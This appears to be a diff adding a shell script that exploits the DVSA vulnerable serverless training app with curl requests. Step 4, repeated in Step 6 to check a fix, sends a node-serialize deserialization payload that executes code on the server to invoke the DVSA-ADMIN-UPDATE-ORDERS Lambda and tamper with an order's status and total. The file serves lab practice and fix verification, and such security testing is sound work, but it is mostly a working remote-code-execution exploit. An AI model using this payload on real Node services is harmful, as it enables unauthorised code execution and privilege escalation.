@@ -1,0 +1,90 @@
+# ================================
+# 
+# ================================
+
+export API="YOUR_API_URL"
+export TOKEN_B="ATTACKER_TOKEN"
+
+# ================================
+# Step 1 — Create a new order
+# ================================
+
+curl -s "$API" \
+-H "content-type: application/json" \
+-H "authorization: $TOKEN_B" \
+--data-raw '{"action":"new","cart-id":"test123","items":{"1":1}}' | jq
+
+# Save returned order-id
+export ORDER_ID="YOUR_ORDER_ID"
+
+
+# ================================
+# Step 2 — Add shipping
+# ================================
+
+curl -s "$API" \
+-H "content-type: application/json" \
+-H "authorization: $TOKEN_B" \
+--data-raw "{\"action\":\"shipping\",\"order-id\":\"$ORDER_ID\",\"data\":{\"address\":\"Test\",\"email\":\"user@example.com\",\"name\":\"Test User\"}}" | jq
+
+
+# ================================
+# Step 3 — Check order BEFORE exploit
+# ================================
+
+curl -s "$API" \
+-H "content-type: application/json" \
+-H "authorization: $TOKEN_B" \
+--data-raw "{\"action\":\"get\",\"order-id\":\"$ORDER_ID\"}" | jq
+
+
+# ================================
+# Step 4 — Exploit (invoke admin function)
+# ================================
+
+curl -X POST "$API" \
+-H "Content-Type: application/json" \
+-H "authorization: $TOKEN_B" \
+-d "{\"action\":\"_\$\$ND_FUNC\$\$_function(){var p={headers:{authorization:'$TOKEN_B'},body:{action:'update','order-id':'$ORDER_ID',item:{token:'FAKE123',ts:123456,itemList:{'1':1},address:'Test',total:10,status:120}}};var a=require('@aws-sdk/client-lambda');var c=new a.LambdaClient({});var cmd=new a.InvokeCommand({FunctionName:'DVSA-ADMIN-UPDATE-ORDERS',InvocationType:'RequestResponse',Payload:Buffer.from(JSON.stringify(p))});c.send(cmd);}()\",\"cart-id\":\"\"}"
+
+
+# ================================
+# Step 5 — Check order AFTER exploit
+# ================================
+
+curl -s "$API" \
+-H "content-type: application/json" \
+-H "authorization: $TOKEN_B" \
+--data-raw "{\"action\":\"get\",\"order-id\":\"$ORDER_ID\"}" | jq
+
+
+# ================================
+# Step 6 — Verification AFTER FIX
+# (Run AFTER applying fixes)
+# ================================
+
+# Create new order again
+curl -s "$API" \
+-H "content-type: application/json" \
+-H "authorization: $TOKEN_B" \
+--data-raw '{"action":"new","cart-id":"test456","items":{"1":1}}' | jq
+
+export ORDER_ID2="NEW_ORDER_ID"
+
+# Add shipping
+curl -s "$API" \
+-H "content-type: application/json" \
+-H "authorization: $TOKEN_B" \
+--data-raw "{\"action\":\"shipping\",\"order-id\":\"$ORDER_ID2\",\"data\":{\"address\":\"Test\",\"email\":\"user@example.com\",\"name\":\"Test User\"}}" | jq
+
+# Attempt exploit again (should fail)
+curl -X POST "$API" \
+-H "Content-Type: application/json" \
+-H "authorization: $TOKEN_B" \
+-d "{\"action\":\"_\$\$ND_FUNC\$\$_function(){var p={headers:{authorization:'$TOKEN_B'},body:{action:'update','order-id':'$ORDER_ID2',item:{token:'FAKE123',ts:123456,itemList:{'1':1},address:'Test',total:10,status:120}}};var a=require('@aws-sdk/client-lambda');var c=new a.LambdaClient({});var cmd=new a.InvokeCommand({FunctionName:'DVSA-ADMIN-UPDATE-ORDERS',InvocationType:'RequestResponse',Payload:Buffer.from(JSON.stringify(p))});c.send(cmd);}()\",\"cart-id\":\"\"}"
+
+# Check order again (should remain unchanged)
+curl -s "$API" \
+-H "content-type: application/json" \
+-H "authorization: $TOKEN_B" \
+--data-raw "{\"action\":\"get\",\"order-id\":\"$ORDER_ID2\"}" | jq
